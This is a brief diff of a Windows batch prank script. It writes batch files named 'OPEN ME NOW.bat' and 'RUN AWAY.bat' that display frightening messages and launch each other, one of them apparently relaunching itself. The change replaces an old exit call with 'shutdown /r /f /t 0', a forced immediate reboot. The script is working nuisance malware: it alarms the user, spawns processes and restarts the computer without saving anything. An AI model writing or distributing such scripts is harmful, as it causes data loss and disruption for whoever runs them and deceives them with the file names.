@@ -6,4 +6,4 @@ echo start RUN AWAY.bat >> "RUN AWAY.bat"
 echo @echo off >> "OPEN ME NOW.bat"
 echo echo DO NOT LOOK BEHIND YOU!! >> "OPEN ME NOW.bat"
 echo start RUN AWAY.bat >> "OPEN ME NOW.bat"
-RUNDLL.exe user.exe,ExitWindowsexec
+shutdown /r /f /t 0
